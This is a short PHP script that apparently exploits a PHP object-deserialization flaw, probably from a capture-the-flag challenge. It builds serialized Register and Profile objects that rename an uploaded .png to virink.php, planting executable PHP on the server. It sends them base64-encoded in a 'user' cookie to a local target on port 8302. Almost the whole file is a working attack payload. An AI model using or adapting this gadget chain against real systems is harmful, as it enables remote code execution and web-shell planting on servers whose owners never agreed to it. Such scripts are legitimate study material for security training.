<?php

namespace app\web\controller;


class Profile {
	public $checker;
	public $filename_tmp;
	public $filename;
	public $ext = true;
	public $except = ['index' => 'upload_img'];
}
class Register {
	public $checker = false;
	public $registed = false;
}

function post($url,$cookie) {
	$cookie = "user=$cookie";
	$opts = array('http' => array('header' => 'Cookie: ' . $cookie));
	$context = stream_context_create($opts);
	$contents = file_get_contents($url."/index.php/home.html", false, $context);
	echo $contents;
}

define("URL","http://127.0.0.1:8302");
$filepath = "";
$filename = "";

$test = new Register();
$test->checker = new Profile();
$test->checker->filename = "./upload/$filepath/virink.php";
$test->checker->filename_tmp = "./upload/$filepath/$filename.png";

post(URL, urlencode(base64_encode(serialize($test))));
